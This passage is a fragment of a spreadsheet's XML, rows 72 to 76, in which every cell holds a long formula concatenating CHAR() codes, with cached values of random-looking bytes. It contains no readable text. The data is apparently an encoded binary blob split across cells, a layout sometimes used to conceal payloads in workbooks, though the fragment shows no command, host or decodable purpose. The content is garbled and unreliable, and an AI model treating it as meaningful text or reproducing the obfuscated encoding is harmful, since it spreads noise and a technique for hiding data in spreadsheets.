amp;CHAR(243)&amp;CHAR(112)&amp;CHAR(17)&amp;CHAR(210)&amp;CHAR(237)&amp;CHAR(109)&amp;CHAR(64)&amp;CHAR(56)&amp;CHAR(206)&amp;CHAR(192)&amp;CHAR(95)&amp;CHAR(242)&amp;CHAR(183)&amp;CHAR(157)&amp;CHAR(141)&amp;CHAR(134)&amp;CHAR(35)&amp;CHAR(140)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(252)&amp;CHAR(74)&amp;CHAR(157)&amp;CHAR(198)&amp;CHAR(155)&amp;CHAR(80)&amp;CHAR(171)&amp;CHAR(97)&amp;CHAR(242)&amp;CHAR(91)&amp;CHAR(182)&amp;CHAR(209)&amp;CHAR(113)&amp;CHAR(101)&amp;CHAR(23)&amp;CHAR(172)&amp;CHAR(152)&amp;CHAR(254)&amp;CHAR(187)&amp;CHAR(140)&amp;CHAR(228)&amp;CHAR(151)&amp;CHAR(59)&amp;CHAR(25)&amp;CHAR(120)&amp;CHAR(29)&amp;CHAR(41)&amp;CHAR(194)&amp;CHAR(194)&amp;CHAR(106)&amp;CHAR(96)&amp;CHAR(7)&amp;CHAR(220)&amp;CHAR(156)&amp;CHAR(216)&amp;CHAR(79)&amp;CHAR(176)&amp;CHAR(29)&amp;CHAR(180)&amp;CHAR(126)&amp;CHAR(118)&amp;CHAR(30)&amp;CHAR(208)&amp;CHAR(167)&amp;CHAR(136)&amp;CHAR(20)</f>
        <v>"¥î…5ï“Êûþ³_x0015_\_x000D__x0018_O–[õ×ÒÎÝ_x0008_×mG!Òå®»_x0006_‘ÀëZ1M}_Õ~ïOž·Ï8_x001E_lÆ_x0002_}vy˜iÆ"_x000C__´_x0002_}R_x000C_íÌýr¿_x0005__x0019_qg¿_x001B__x0006_A&lt;ð_6›-®3Ò[Ä“ûá&gt;
_x000F_þ§î íæí_x0013_[F¾—ò_x0006_›î¿¹_x0012_=kº_x001D_tK™øäŸí¡?öscò_x000C_R	žéh&lt;¶l	Ÿ:öº¢j±kZÊp_x0014_¹Äª˜E™Ø_x0003_Û¬¶_x000B_»­ð%q(„f#ˆô®ÇëÔ…bóp_x0011_Òím@8ÎÀ_ò·†#Œ_x000D__x000B_üJÆ›P«aò[¶Ñqe_x0017_¬˜þ»Œä—;_x0019_x_x001D_)ÂÂj`_x0007_ÜœØO°_x001D_´~v_x001E_Ð§ˆ_x0014_</v>
      </c>
      <c r="C72" t="str">
        <f>CHAR(179)&amp;CHAR(68)&amp;CHAR(62)&amp;CHAR(212)&amp;CHAR(154)&amp;CHAR(67)&amp;CHAR(37)&amp;CHAR(128)&amp;CHAR(211)&amp;CHAR(207)</f>
        <v>³D&gt;ÔšC%€ÓÏ</v>
      </c>
    </row>
    <row r="73" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B73" t="str">
        <f>CHAR(191)&amp;CHAR(28)&amp;CHAR(37)&amp;CHAR(85)&amp;CHAR(221)&amp;CHAR(230)&amp;CHAR(45)&amp;CHAR(124)&amp;CHAR(234)&amp;CHAR(139)&amp;CHAR(168)&amp;CHAR(2)&amp;CHAR(43)&amp;CHAR(86)&amp;CHAR(139)&amp;CHAR(30)&amp;CHAR(138)&amp;CHAR(218)&amp;CHAR(194)&amp;CHAR(248)&amp;CHAR(76)&amp;CHAR(74)&amp;CHAR(83)&amp;CHAR(167)&amp;CHAR(119)&amp;CHAR(172)&amp;CHAR(251)&amp;CHAR(122)&amp;CHAR(42)&amp;CHAR(223)&amp;CHAR(50)&amp;CHAR(177)&amp;CHAR(134)&amp;CHAR(150)&amp;CHAR(107)&amp;CHAR(61)&amp;CHAR(143)&amp;CHAR(136)&amp;CHAR(192)&amp;CHAR(99)&amp;CHAR(242)&amp;CHAR(206)&amp;CHAR(221)&amp;CHAR(174)&amp;CHAR(77)&amp;CHAR(229)&amp;CHAR(249)&amp;CHAR(167)&amp;CHAR(222)&amp;CHAR(114)&amp;CHAR(122)&amp;CHAR(137)&amp;CHAR(41)&amp;CHAR(49)&amp;CHAR(254)&amp;CHAR(153)&amp;CHAR(113)&amp;CHAR(64)&amp;CHAR(196)&amp;CHAR(34)&amp;CHAR(181)&amp;CHAR(134)&amp;CHAR(145)&amp;CHAR(125)&amp;CHAR(22)&amp;CHAR(67)&amp;CHAR(214)&amp;CHAR(154)&amp;CHAR(35)&amp;CHAR(29)&amp;CHAR(49)&amp;CHAR(191)&amp;CHAR(35)&amp;CHAR(193)&amp;CHAR(166)&amp;CHAR(203)&amp;CHAR(148)&amp;CHAR(172)&amp;CHAR(143)&amp;CHAR(176)&amp;CHAR(224)&amp;CHAR(225)&amp;CHAR(42)&amp;CHAR(2)&amp;CHAR(75)&amp;CHAR(174)&amp;CHAR(141)&amp;CHAR(133)&amp;CHAR(173)&amp;CHAR(244)&amp;CHAR(46)&amp;CHAR(189)&amp;CHAR(171)&amp;CHAR(14)&amp;CHAR(80)&amp;CHAR(193)&amp;CHAR(188)&amp;CHAR(31)&amp;CHAR(154)&amp;CHAR(17)&amp;CHAR(51)&amp;CHAR(226)&amp;CHAR(103)&amp;CHAR(126)&amp;CHAR(211)&amp;CHAR(149)&amp;CHAR(72)&amp;CHAR(236)&amp;CHAR(70)&amp;CHAR(236)&amp;CHAR(70)&amp;CHAR(252)&amp;CHAR(215)&amp;CHAR(145)&amp;CHAR(86)&amp;CHAR(149)&amp;CHAR(108)&amp;CHAR(35)&amp;CHAR(216)&amp;CHAR(177)&amp;CHAR(113)&amp;CHAR(117)&amp;CHAR(206)&amp;CHAR(24)&amp;CHAR(104)&amp;CHAR(201)&amp;CHAR(73)&amp;CHAR(37)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(159)&amp;CHAR(133)&amp;CHAR(123)&amp;CHAR(102)&amp;CHAR(146)&amp;CHAR(107)&amp;CHAR(129)&amp;CHAR(19)&amp;CHAR(216)&amp;CHAR(238)&amp;CHAR(217)&amp;CHAR(189)&amp;CHAR(93)&amp;CHAR(163)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(43)&amp;CHAR(206)&amp;CHAR(39)&amp;CHAR(134)&amp;CHAR(10)&amp;CHAR(124)&amp;CHAR(220)&amp;CHAR(87)&amp;CHAR(251)&amp;CHAR(165)&amp;CHAR(197)&amp;CHAR(39)&amp;CHAR(13)&amp;CHAR(245)&amp;CHAR(119)&amp;CHAR(242)&amp;CHAR(87)&amp;CHAR(64)&amp;CHAR(137)&amp;CHAR(137)&amp;CHAR(186)&amp;CHAR(188)&amp;CHAR(65)&amp;CHAR(167)&amp;CHAR(229)&amp;CHAR(218)&amp;CHAR(97)&amp;CHAR(116)&amp;CHAR(33)&amp;CHAR(83)&amp;CHAR(137)&amp;CHAR(218)&amp;CHAR(26)&amp;CHAR(193)&amp;CHAR(72)&amp;CHAR(96)&amp;CHAR(103)&amp;CHAR(19)&amp;CHAR(132)&amp;CHAR(18)&amp;CHAR(196)&amp;CHAR(15)&amp;CHAR(32)&amp;CHAR(3)&amp;CHAR(210)&amp;CHAR(161)&amp;CHAR(199)&amp;CHAR(119)&amp;CHAR(233)&amp;CHAR(98)&amp;CHAR(169)&amp;CHAR(21)&amp;CHAR(117)&amp;CHAR(1)&amp;CHAR(73)&amp;CHAR(134)&amp;CHAR(134)&amp;CHAR(107)&amp;CHAR(89)&amp;CHAR(2)&amp;CHAR(159)&amp;CHAR(73)&amp;CHAR(54)&amp;CHAR(105)&amp;CHAR(40)&amp;CHAR(139)&amp;CHAR(51)&amp;CHAR(80)&amp;CHAR(226)&amp;CHAR(194)&amp;CHAR(12)&amp;CHAR(186)&amp;CHAR(79)&amp;CHAR(51)&amp;CHAR(187)&amp;CHAR(186)&amp;CHAR(34)&amp;CHAR(206)&amp;CHAR(40)&amp;CHAR(107)&amp;CHAR(106)&amp;CHAR(29)&amp;CHAR(151)&amp;CHAR(180)&amp;CHAR(12)&amp;CHAR(227)&amp;CHAR(11)&amp;CHAR(171)&amp;CHAR(20)&amp;CHAR(140)&amp;CHAR(231)&amp;CHAR(210)&amp;CHAR(180)&amp;CHAR(255)&amp;CHAR(9)&amp;CHAR(237)&amp;CHAR(99)&amp;CHAR(192)&amp;CHAR(115)&amp;CHAR(181)&amp;CHAR(25)&amp;CHAR(8)&amp;CHAR(49)&amp;CHAR(77)&amp;CHAR(53)&amp;CHAR(199)&amp;CHAR(217)&amp;CHAR(4)&amp;CHAR(218)</f>
        <v>¿_x001C_%UÝæ-|ê‹¨_x0002_+V‹_x001E_ŠÚÂøLJS§w¬ûz*ß2±†–k=ˆÀcòÎÝ®Måù§Þrz‰)1þ™q@Ä"µ†‘}_x0016_CÖš#_x001D_1¿#Á¦Ë”¬°àá*_x0002_K®…­ô.½«_x000E_PÁ¼_x001F_š_x0011_3âg~Ó•HìFìFü×‘V•l#Ø±quÎ_x0018_hÉI%_x0006_	Ÿ…{f’k_x0013_ØîÙ½]£Ž»+Î'†
|ÜWû¥Å'_x000D_õwòW@‰‰º¼A§åÚat!S‰Ú_x001A_ÁH`g_x0013_„_x0012_Ä_x000F_ _x0003_Ò¡Çwéb©_x0015_u_x0001_I††kY_x0002_ŸI6i(‹3PâÂ_x000C_ºO3»º"Î(kj_x001D_—´_x000C_ã_x000B_«_x0014_ŒçÒ´ÿ	ícÀsµ_x0019__x0008_1M5ÇÙ_x0004_Ú</v>
      </c>
      <c r="C73" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(159)&amp;CHAR(75)&amp;CHAR(225)&amp;CHAR(221)&amp;CHAR(179)&amp;CHAR(66)&amp;CHAR(43)&amp;CHAR(145)</f>
        <v>&gt;±ŸKáÝ³B+‘</v>
      </c>
    </row>
    <row r="74" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B74" t="str">
        <f>CHAR(144)&amp;CHAR(248)&amp;CHAR(98)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(143)&amp;CHAR(209)&amp;CHAR(200)&amp;CHAR(83)&amp;CHAR(54)&amp;CHAR(90)&amp;CHAR(48)&amp;CHAR(210)&amp;CHAR(230)&amp;CHAR(243)&amp;CHAR(144)&amp;CHAR(194)&amp;CHAR(173)&amp;CHAR(163)&amp;CHAR(104)&amp;CHAR(18)&amp;CHAR(218)&amp;CHAR(185)&amp;CHAR(237)&amp;CHAR(212)&amp;CHAR(221)&amp;CHAR(99)&amp;CHAR(146)&amp;CHAR(35)&amp;CHAR(58)&amp;CHAR(88)&amp;CHAR(180)&amp;CHAR(142)&amp;CHAR(188)&amp;CHAR(161)&amp;CHAR(56)&amp;CHAR(224)&amp;CHAR(37)&amp;CHAR(81)&amp;CHAR(92)&amp;CHAR(198)&amp;CHAR(237)&amp;CHAR(228)&amp;CHAR(108)&amp;CHAR(113)&amp;CHAR(11)&amp;CHAR(40)&amp;CHAR(208)&amp;CHAR(100)&amp;CHAR(217)&amp;CHAR(203)&amp;CHAR(77)&amp;CHAR(236)&amp;CHAR(101)&amp;CHAR(202)&amp;CHAR(7)&amp;CHAR(134)&amp;CHAR(181)&amp;CHAR(34)&amp;CHAR(155)&amp;CHAR(48)&amp;CHAR(176)&amp;CHAR(82)&amp;CHAR(255)&amp;CHAR(204)&amp;CHAR(115)&amp;CHAR(97)&amp;CHAR(63)&amp;CHAR(194)&amp;CHAR(68)&amp;CHAR(72)&amp;CHAR(240)&amp;CHAR(134)&amp;CHAR(59)&amp;CHAR(225)&amp;CHAR(123)&amp;CHAR(90)&amp;CHAR(40)&amp;CHAR(51)&amp;CHAR(184)&amp;CHAR(149)&amp;CHAR(41)&amp;CHAR(254)&amp;CHAR(147)&amp;CHAR(232)&amp;CHAR(223)&amp;CHAR(211)&amp;CHAR(8)&amp;CHAR(174)&amp;CHAR(38)&amp;CHAR(247)&amp;CHAR(15)&amp;CHAR(68)&amp;CHAR(26)&amp;CHAR(156)&amp;CHAR(94)&amp;CHAR(46)&amp;CHAR(70)&amp;CHAR(146)&amp;CHAR(164)&amp;CHAR(152)&amp;CHAR(21)&amp;CHAR(94)&amp;CHAR(92)&amp;CHAR(210)&amp;CHAR(3)&amp;CHAR(214)&amp;CHAR(147)&amp;CHAR(18)&amp;CHAR(179)&amp;CHAR(231)&amp;CHAR(211)&amp;CHAR(231)&amp;CHAR(58)&amp;CHAR(36)&amp;CHAR(78)&amp;CHAR(188)&amp;CHAR(178)&amp;CHAR(233)&amp;CHAR(132)&amp;CHAR(73)&amp;CHAR(197)&amp;CHAR(127)&amp;CHAR(179)&amp;CHAR(5)&amp;CHAR(53)&amp;CHAR(223)&amp;CHAR(94)&amp;CHAR(200)&amp;CHAR(118)&amp;CHAR(186)&amp;CHAR(56)&amp;CHAR(70)&amp;CHAR(221)&amp;CHAR(131)&amp;CHAR(5)&amp;CHAR(189)&amp;CHAR(230)&amp;CHAR(123)&amp;CHAR(56)&amp;CHAR(243)&amp;CHAR(53)&amp;CHAR(23)&amp;CHAR(250)&amp;CHAR(99)&amp;CHAR(153)&amp;CHAR(28)&amp;CHAR(186)&amp;CHAR(94)&amp;CHAR(25)&amp;CHAR(8)&amp;CHAR(125)&amp;CHAR(190)&amp;CHAR(42)&amp;CHAR(150)&amp;CHAR(250)&amp;CHAR(53)&amp;CHAR(106)&amp;CHAR(149)&amp;CHAR(94)&amp;CHAR(137)&amp;CHAR(134)&amp;CHAR(108)&amp;CHAR(41)&amp;CHAR(220)&amp;CHAR(242)&amp;CHAR(37)&amp;CHAR(173)&amp;CHAR(148)&amp;CHAR(141)&amp;CHAR(112)&amp;CHAR(71)&amp;CHAR(149)&amp;CHAR(5)&amp;CHAR(147)&amp;CHAR(33)&amp;CHAR(95)&amp;CHAR(179)&amp;CHAR(2)&amp;CHAR(253)&amp;CHAR(108)&amp;CHAR(29)&amp;CHAR(21)&amp;CHAR(151)&amp;CHAR(75)&amp;CHAR(53)&amp;CHAR(254)&amp;CHAR(231)&amp;CHAR(64)&amp;CHAR(102)&amp;CHAR(135)&amp;CHAR(65)&amp;CHAR(182)&amp;CHAR(88)&amp;CHAR(230)&amp;CHAR(34)&amp;CHAR(22)&amp;CHAR(129)&amp;CHAR(35)&amp;CHAR(177)&amp;CHAR(44)&amp;CHAR(114)&amp;CHAR(71)&amp;CHAR(100)&amp;CHAR(48)&amp;CHAR(67)&amp;CHAR(112)&amp;CHAR(67)&amp;CHAR(157)&amp;CHAR(85)&amp;CHAR(235)&amp;CHAR(185)&amp;CHAR(49)&amp;CHAR(250)&amp;CHAR(82)&amp;CHAR(61)&amp;CHAR(229)&amp;CHAR(41)&amp;CHAR(90)&amp;CHAR(22)&amp;CHAR(57)&amp;CHAR(23)&amp;CHAR(54)&amp;CHAR(98)&amp;CHAR(182)&amp;CHAR(134)&amp;CHAR(68)&amp;CHAR(186)&amp;CHAR(37)&amp;CHAR(44)&amp;CHAR(19)&amp;CHAR(146)&amp;CHAR(245)&amp;CHAR(216)&amp;CHAR(169)&amp;CHAR(41)&amp;CHAR(150)&amp;CHAR(249)&amp;CHAR(139)&amp;CHAR(121)&amp;CHAR(110)&amp;CHAR(144)&amp;CHAR(240)&amp;CHAR(43)&amp;CHAR(59)&amp;CHAR(194)&amp;CHAR(147)&amp;CHAR(249)&amp;CHAR(38)&amp;CHAR(64)&amp;CHAR(120)&amp;CHAR(137)&amp;CHAR(142)&amp;CHAR(33)&amp;CHAR(203)</f>
        <v>øb_x0003_„ÑÈS6Z0ÒæóÂ­£h_x0012_Ú¹íÔÝc’#:X´Ž¼¡8à%Q\Æíälq_x000B_(ÐdÙËMìeÊ_x0007_†µ"›0°RÿÌsa?ÂDHð†;á{Z(3¸•)þ“èßÓ_x0008_®&amp;÷_x000F_D_x001A_œ^.F’¤˜_x0015_^\Ò_x0003_Ö“_x0012_³çÓç:$N¼²é„IÅ³_x0005_5ß^Èvº8FÝƒ_x0005_½æ{8ó5_x0017_úc™_x001C_º^_x0019__x0008_}¾*–ú5j•^‰†l)Üò%­”pG•_x0005_“!_³_x0002_ýl_x001D__x0015_—K5þç@f‡A¶Xæ"_x0016_#±,rGd0CpCUë¹1úR=å)Z_x0016_9_x0017_6b¶†Dº%,_x0013_’õØ©)–ù‹ynð+;Â“ù&amp;@x‰Ž!Ë</v>
      </c>
      <c r="C74" t="str">
        <f>CHAR(210)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(68)&amp;CHAR(50)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)</f>
        <v>ÒÈ!À³D2”þÈ</v>
      </c>
    </row>
    <row r="75" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B75" t="str">
        <f>CHAR(44)&amp;CHAR(38)&amp;CHAR(187)&amp;CHAR(200)&amp;CHAR(175)&amp;CHAR(185)&amp;CHAR(174)&amp;CHAR(250)&amp;CHAR(76)&amp;CHAR(170)&amp;CHAR(101)&amp;CHAR(6)&amp;CHAR(186)&amp;CHAR(174)&amp;CHAR(13)&amp;CHAR(20)&amp;CHAR(136)&amp;CHAR(5)&amp;CHAR(211)&amp;CHAR(96)&amp;CHAR(22)&amp;CHAR(168)&amp;CHAR(129)&amp;CHAR(17)&amp;CHAR(132)&amp;CHAR(221)&amp;CHAR(208)&amp;CHAR(47)&amp;CHAR(108)&amp;CHAR(237)&amp;CHAR(23)&amp;CHAR(239)&amp;CHAR(185)&amp;CHAR(67)&amp;CHAR(177)&amp;CHAR(49)&amp;CHAR(95)&amp;CHAR(35)&amp;CHAR(4)&amp;CHAR(118)&amp;CHAR(81)&amp;CHAR(147)&amp;CHAR(35)&amp;CHAR(168)&amp;CHAR(201)&amp;CHAR(156)&amp;CHAR(163)&amp;CHAR(44)&amp;CHAR(254)&amp;CHAR(178)&amp;CHAR(130)&amp;CHAR(224)&amp;CHAR(236)&amp;CHAR(141)&amp;CHAR(231)&amp;CHAR(173)&amp;CHAR(91)&amp;CHAR(111)&amp;CHAR(20)&amp;CHAR(81)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(249)&amp;CHAR(158)&amp;CHAR(168)&amp;CHAR(72)&amp;CHAR(126)&amp;CHAR(88)&amp;CHAR(221)&amp;CHAR(69)&amp;CHAR(109)&amp;CHAR(199)&amp;CHAR(78)&amp;CHAR(199)&amp;CHAR(248)&amp;CHAR(70)&amp;CHAR(212)&amp;CHAR(244)&amp;CHAR(65)&amp;CHAR(232)&amp;CHAR(194)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(229)&amp;CHAR(100)&amp;CHAR(169)&amp;CHAR(253)&amp;CHAR(50)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(254)&amp;CHAR(142)&amp;CHAR(89)&amp;CHAR(135)&amp;CHAR(73)&amp;CHAR(17)&amp;CHAR(29)&amp;CHAR(116)&amp;CHAR(224)&amp;CHAR(254)&amp;CHAR(231)&amp;CHAR(21)&amp;CHAR(192)&amp;CHAR(77)&amp;CHAR(16)&amp;CHAR(14)&amp;CHAR(58)&amp;CHAR(18)&amp;CHAR(180)&amp;CHAR(36)&amp;CHAR(133)&amp;CHAR(181)&amp;CHAR(44)&amp;CHAR(34)&amp;CHAR(215)&amp;CHAR(45)&amp;CHAR(245)&amp;CHAR(141)&amp;CHAR(196)&amp;CHAR(229)&amp;CHAR(64)&amp;CHAR(175)&amp;CHAR(195)&amp;CHAR(82)&amp;CHAR(25)&amp;CHAR(6)&amp;CHAR(27)&amp;CHAR(77)&amp;CHAR(119)&amp;CHAR(225)&amp;CHAR(208)&amp;CHAR(166)&amp;CHAR(250)&amp;CHAR(151)&amp;CHAR(96)&amp;CHAR(143)&amp;CHAR(118)&amp;CHAR(91)&amp;CHAR(252)&amp;CHAR(71)&amp;CHAR(24)&amp;CHAR(80)&amp;CHAR(111)&amp;CHAR(78)&amp;CHAR(149)&amp;CHAR(223)&amp;CHAR(22)&amp;CHAR(136)&amp;CHAR(1)&amp;CHAR(89)&amp;CHAR(168)&amp;CHAR(197)&amp;CHAR(159)&amp;CHAR(36)&amp;CHAR(249)&amp;CHAR(141)&amp;CHAR(226)&amp;CHAR(108)&amp;CHAR(217)&amp;CHAR(185)&amp;CHAR(74)&amp;CHAR(22)&amp;CHAR(109)&amp;CHAR(107)&amp;CHAR(77)&amp;CHAR(167)&amp;CHAR(59)&amp;CHAR(5)&amp;CHAR(150)&amp;CHAR(95)&amp;CHAR(124)&amp;CHAR(231)&amp;CHAR(150)&amp;CHAR(140)&amp;CHAR(13)&amp;CHAR(29)&amp;CHAR(27)&amp;CHAR(251)&amp;CHAR(49)&amp;CHAR(1)&amp;CHAR(102)&amp;CHAR(42)&amp;CHAR(210)&amp;CHAR(50)&amp;CHAR(247)&amp;CHAR(127)&amp;CHAR(184)&amp;CHAR(56)&amp;CHAR(78)&amp;CHAR(48)&amp;CHAR(87)&amp;CHAR(230)&amp;CHAR(196)&amp;CHAR(45)&amp;CHAR(15)&amp;CHAR(100)&amp;CHAR(105)&amp;CHAR(7)&amp;CHAR(151)&amp;CHAR(132)&amp;CHAR(217)&amp;CHAR(236)&amp;CHAR(218)&amp;CHAR(72)&amp;CHAR(43)&amp;CHAR(244)&amp;CHAR(229)&amp;CHAR(213)&amp;CHAR(155)&amp;CHAR(44)&amp;CHAR(137)&amp;CHAR(28)&amp;CHAR(217)&amp;CHAR(27)&amp;CHAR(57)&amp;CHAR(141)&amp;CHAR(33)&amp;CHAR(196)&amp;CHAR(175)&amp;CHAR(177)&amp;CHAR(118)&amp;CHAR(28)&amp;CHAR(151)&amp;CHAR(210)&amp;CHAR(76)&amp;CHAR(28)&amp;CHAR(42)&amp;CHAR(162)&amp;CHAR(12)&amp;CHAR(68)&amp;CHAR(32)&amp;CHAR(123)&amp;CHAR(229)&amp;CHAR(60)&amp;CHAR(201)&amp;CHAR(71)&amp;CHAR(215)&amp;CHAR(5)&amp;CHAR(83)&amp;CHAR(99)&amp;CHAR(221)&amp;CHAR(237)&amp;CHAR(14)&amp;CHAR(245)&amp;CHAR(174)&amp;CHAR(52)&amp;CHAR(168)&amp;CHAR(25)&amp;CHAR(17)&amp;CHAR(27)&amp;CHAR(51)&amp;CHAR(147)&amp;CHAR(222)&amp;CHAR(165)&amp;CHAR(187)</f>
        <v>,&amp;»È¯¹®úLªe_x0006_º®_x000D__x0014_ˆ_x0005_Ó`_x0016_¨_x0011_„ÝÐ/lí_x0017_ï¹C±1_#_x0004_vQ“#¨Éœ£,þ²‚àìç­[o_x0014_Q
_x0001_ùž¨H~XÝEmÇNÇøFÔôAèÂŽNåd©ý2_x0004__x0007_þŽY‡I_x0011__x001D_tàþç_x0015_ÀM_x0010__x000E_:_x0012_´$…µ,"×-õÄå@¯ÃR_x0019__x0006__x001B_MwáÐ¦ú—`v[üG_x0018_PoN•ß_x0016_ˆ_x0001_Y¨ÅŸ$ùâlÙ¹J_x0016_mkM§;_x0005_–_|ç–Œ_x000D__x001D__x001B_û1_x0001_f*Ò2÷¸8N0WæÄ-_x000F_di_x0007_—„ÙìÚH+ôåÕ›,‰_x001C_Ù_x001B_9!Ä¯±v_x001C_—ÒL_x001C_*¢_x000C_D {å&lt;ÉG×_x0005_ScÝí_x000E_õ®4¨_x0019__x0011__x001B_3“Þ¥»</v>
      </c>
      <c r="C75" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(76)&amp;CHAR(255)&amp;CHAR(193)&amp;CHAR(158)&amp;CHAR(67)&amp;CHAR(40)&amp;CHAR(90)</f>
        <v>!¥³LÿÁžC(Z</v>
      </c>
    </row>
    <row r="76" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B76" t="str">
        <f>CHAR(105)&amp;CHAR(66)&amp;CHAR(226)&amp;CHAR(77)&amp;CHAR(90)&amp;CHAR(181)&amp;CHAR(93)&amp;CHAR(238)&amp;CHAR(235)&amp;CHAR(254)&amp;CHAR(120)&amp;CHAR(57)&amp;CHAR(253)&amp;CHAR(44)&amp;CHAR(160)&amp;CHAR(95)&amp;CHAR(30)&amp;CHAR(51)&amp;CHAR(234)&amp;CHAR(77)&amp;CHAR(9)&amp;CHAR(254)&amp;CHAR(58)&amp;CHAR(180)&amp;CHAR(57)&amp;CHAR(8)&amp;CHAR(108)&amp;CHAR(16)&amp;CHAR(246)&amp;CHAR(42)&amp;CHAR(2)&amp;CHAR(134)&amp;CHAR(41)&amp;CHAR(8)&amp;CHAR(208)&amp;CHAR(28)&amp;CHAR(54)&amp;CHAR(214)&amp;CHAR(92)&amp;CHAR(223)&amp;CHAR(143)&amp;CHAR(18)&amp;CHAR(13)&amp;CHAR(238)&amp;CHAR(247)&amp;CHAR(229)&amp;CHAR(226)&amp;CHAR(118)&amp;CHAR(106)&amp;CHAR(102)&amp;CHAR(28)&amp;CHAR(240)&amp;CHAR(212)&amp;CHAR(235)&amp;CHAR(205)&amp;CHAR(56)&amp;CHAR(109)&amp;CHAR(48)&amp;CHAR(216)&amp;CHAR(188)&amp;CHAR(195)&amp;CHAR(19)&amp;CHAR(69)&amp;CHAR(245)&amp;CHAR(143)&amp;CHAR(67)&amp;CHAR(252)&amp;CHAR(149)&amp;CHAR(108)&amp;CHAR(96)&amp;CHAR(84)&amp;CHAR(81)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(213)&amp;CHAR(58)&amp;CHAR(230)&amp;CHAR(150)&amp;CHAR(21)&amp;CHAR(71)&amp;CHAR(200)&amp;CHAR(4)&amp;CHAR(97)&amp;CHAR(227)&amp;CHAR(14)&amp;CHAR(195)&amp;CHAR(195)&amp;CHAR(95)&amp;CHAR(236)&amp;CHAR(164)&amp;CHAR(246)&amp;CHAR(242)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(141)&amp;CHAR(118)&amp;CHAR(198)&amp;CHAR(5)&amp;CHAR(189)&amp;CHAR(13)&amp;CHAR(58)&amp;CHAR(187)&amp;CHAR(131)&amp;CHAR(146)&amp;CHAR(164)&amp;CHAR(19)&amp;CHAR(225)&amp;CHAR(138)&amp;CHAR(100)&amp;CHAR(207)&amp;CHAR(27)&amp;CHAR(78)&amp;CHAR(10)&amp;CHAR(56)&amp;CHAR(248)&amp;CHAR(99)&amp;CHAR(11)&amp;CHAR(128)&amp;CHAR(81)&amp;CHAR(116)&amp;CHAR(167)&amp;CHAR(168)&amp;CHAR(207)&amp;CHAR(185)&amp;CHAR(8)&amp;CHAR(198)&amp;CHAR(40)&amp;CHAR(228)&amp;CHAR(12)&amp;CHAR(148)&amp;CHAR(247)&amp;CHAR(44)&amp;CHAR(16)&amp;CHAR(78)&amp;CHAR(206)&amp;CHAR(131)&amp;CHAR(216)&amp;CHAR(59)&amp;CHAR(98)&amp;CHAR(193)&amp;CHAR(121)&amp;CHAR(108)&amp;CHAR(237)&amp;CHAR(135)&amp;CHAR(200)&amp;CHAR(73)&amp;CHAR(39)&amp;CHAR(172)&amp;CHAR(203)&amp;CHAR(112)&amp;CHAR(194)&amp;CHAR(9)&amp;CHAR(96)&amp;CHAR(88)&amp;CHAR(40)&amp;CHAR(142)&amp;CHAR(145)&amp;CHAR(76)&amp;CHAR(157)&amp;CHAR(36)&amp;CHAR(114)&amp;CHAR(166)&amp;CHAR(99)&amp;CHAR(14)&amp;CHAR(196)&amp;CHAR(152)&amp;CHAR(76)&amp;CHAR(203)&amp;CHAR(119)&amp;CHAR(138)&amp;CHAR(42)&amp;CHAR(89)&amp;CHAR(125)&amp;CHAR(39)&amp;CHAR(113)&amp;CHAR(68)&amp;CHAR(70)&amp;CHAR(170)&amp;CHAR(197)&amp;CHAR(75)&amp;CHAR(188)&amp;CHAR(32)&amp;CHAR(25)&amp;CHAR(128)&amp;CHAR(14)&amp;CHAR(200)&amp;CHAR(78)&amp;CHAR(156)&amp;CHAR(12)&amp;CHAR(126)&amp;CHAR(155)&amp;CHAR(95)&amp;CHAR(167)&amp;CHAR(122)&amp;CHAR(190)&amp;CHAR(70)&amp;CHAR(77)&amp;CHAR(51)&amp;CHAR(103)&amp;CHAR(128)&amp;CHAR(86)&amp;CHAR(41)&amp;CHAR(206)&amp;CHAR(24)&amp;CHAR(180)&amp;CHAR(194)&amp;CHAR(69)&amp;CHAR(114)&amp;CHAR(121)&amp;CHAR(197)&amp;CHAR(132)&amp;CHAR(236)&amp;CHAR(1)&amp;CHAR(168)&amp;CHAR(67)&amp;CHAR(197)&amp;CHAR(57)&amp;CHAR(230)&amp;CHAR(183)&amp;CHAR(51)&amp;CHAR(100)&amp;CHAR(225)&amp;CHAR(49)&amp;CHAR(110)&amp;CHAR(168)&amp;CHAR(103)&amp;CHAR(60)&amp;CHAR(2)&amp;CHAR(38)&amp;CHAR(104)&amp;CHAR(172)&amp;CHAR(199)&amp;CHAR(122)&amp;CHAR(26)&amp;CHAR(69)&amp;CHAR(5)&amp;CHAR(183)&amp;CHAR(227)&amp;CHAR(13)&amp;CHAR(216)&amp;CHAR(213)&amp;CHAR(129)&amp;CHAR(97)&amp;CHAR(106)&amp;CHAR(54)&amp;CHAR(223)&amp;CHAR(101)&amp;CHAR(176)&amp;CHAR(116)&amp;CHAR(6)&amp;CHAR(234)&amp;CHAR(129)&amp;CHAR(188)&amp;CHAR(182)&amp;CHAR(112)</f>
        <v>iBâMZµ]îëþx9ý, __x001E_3êM	þ:´9_x0008_l_x0010_ö*_x0002_†)_x0008_Ð_x001C_6Ö\ß_x0012__x000D_î÷åâvjf_x001C_ðÔëÍ8m0Ø¼Ã_x0013_EõCü•l`TQ_x000B__x0001_Õ:æ–_x0015_GÈ_x0004_aã_x000E_ÃÃ_ì¤öòë»vÆ_x0005_½_x000D_:»ƒ’¤_x0013_áŠdÏ_x001B_N
